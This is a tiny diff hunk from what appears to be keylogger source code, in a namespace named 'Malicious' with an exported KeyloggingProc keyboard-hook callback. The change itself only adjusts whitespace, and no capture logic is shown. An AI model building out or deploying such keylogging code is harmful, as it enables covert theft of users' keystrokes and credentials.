@@ -15,7 +15,7 @@ namespace Malicious
         DWORD flags;
         DWORD time;
         unsigned long * dwExtraInfo;
-    }KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;
+    } KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;
 
     __declspec(dllexport) LRESULT CALLBACK KeyloggingProc(int nCode,  WPARAM wParam,  LPARAM lParam)
     {
